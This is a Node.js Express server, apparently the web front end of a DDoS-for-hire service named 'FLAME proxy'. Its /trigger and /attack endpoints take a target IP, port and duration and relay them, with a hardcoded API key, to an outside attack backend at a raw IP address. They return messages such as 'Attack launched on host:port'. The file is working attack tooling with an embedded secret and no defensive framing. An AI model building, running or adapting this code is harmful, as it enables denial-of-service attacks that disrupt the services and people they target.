const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// HIDDEN API KEY (never exposed to client)
const API_KEY = 'gRzSotjS6tabJ9C6tvUU0fgX5nGvrnYW';
const BASE_URL = 'http://13.232.68.73:3938/attack';

app.use(express.json());
app.use(express.static('public'));

// MAIN UI - serves index.html
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// TRIGGER ENDPOINT - direct attack via URL params
app.get('/trigger', async (req, res) => {
    const { host, port, time } = req.query;

    // Check if all parameters exist
    if (!host || !port || !time) {
        return res.status(400).send('IP parameters are missing');
    }

    try {
        // Fire attack with hidden key
        const response = await axios.get(BASE_URL, {
            params: {
                ip: host,
                port: port,
                time: time,
                key: API_KEY
            },
            timeout: 15000
        });

        // Success response
        res.json({
            success: true,
            message: `Attack launched on ${host}:${port} for ${time}s`,
            detail: response.data
        });

    } catch (error) {
        // Error response
        res.status(500).json({
            success: false,
            message: error.response?.data || error.message
        });
    }
});

// POST endpoint for form submissions (optional)
app.post('/attack', async (req, res) => {
    const { ip, port, time } = req.body;
    if (!ip || !port || !time) {
        return res.status(400).json({ success: false, message: 'Missing parameters' });
    }

    try {
        const response = await axios.get(BASE_URL, {
            params: { ip, port, time, key: API_KEY },
            timeout: 15000
        });
        res.json({ success: true, message: 'Attack triggered', detail: response.data });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🔥 FLAME proxy running on port ${PORT}`);
    console.log(`🔑 Key loaded: ${API_KEY.substring(0,8)}... (hidden)`);
});
